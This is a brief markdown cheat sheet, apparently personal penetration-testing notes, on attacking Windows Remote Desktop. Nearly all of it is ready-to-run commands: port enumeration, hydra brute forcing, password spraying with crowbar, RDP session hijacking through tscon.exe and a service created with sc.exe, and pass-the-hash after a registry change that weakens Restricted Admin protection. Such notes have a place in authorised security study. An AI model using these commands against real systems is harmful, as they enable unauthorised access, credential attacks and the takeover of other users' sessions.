---
title: rdp
aliases:
tags:
---

# rdp


- enumeration
    - `nmap -Pn -p3389 192.168.2.143 `
- desktop `xfreerdp /v:$ip /u:Administrator`
- connect `evil-winrm -u $username -i $ip`
- brute force `hydra -L user.list -P password.list rdp://$ip`
- password spray
    - [crowbar](https://github.com/galkan/crowbar)
        - `sudo apt install -y crowbar`
        - `crowbar -b rdp -s $ip/32 -U users.txt -c 'password123'`
    - hydra
        - `hydra -L usernames.txt -p 'password123' $ip rdp`
- rdp session hijacking
    - requires system privs
    - show all current user sessions `query user`
    - `tscon.exe #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}` 
    - if admin privs only, use `sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"`
        - then `net start sessionhijack`
- rdp Pass-the-Hash
    - requires DisableRestrictedAdmin `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`
    - connect with hash `xfreerdp /v:$ip /u:bob /pth:300FF5E89EF33F83A8146C10F5AB9BB9`
    - 